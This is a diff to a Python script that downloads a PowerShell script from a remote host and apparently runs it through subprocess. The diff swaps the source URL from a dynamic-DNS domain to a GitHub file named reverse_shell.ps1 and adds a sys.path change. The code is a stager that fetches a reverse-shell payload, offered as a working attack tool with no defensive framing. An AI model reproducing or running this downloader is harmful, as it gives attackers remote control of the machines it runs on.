@@ -1,14 +1,18 @@
+import sys
+# Add the directory where 'requests' is located
+sys.path.insert(0, r'C:\\Python\\Lib\\site-packages')
+
 import requests
 import subprocess
 import os
 import time
 
 # URL where the PowerShell script is hosted
-ps_url = 'https://tclancy.mygamesonline.org/rs'  # Replace with the actual URL of your PowerShell script
+ps_url = 'https://github.com/Issac-dev/GlitchGhost/blob/main/reverse_shell.ps1'  # Replace with the actual URL of your PowerShell script
 
 # Fetch the PowerShell script from the server
 def send_request():
-    try:
+    try: 
         response = requests.get(ps_url)
         if response.status_code == 200:
             ps_script = response.text
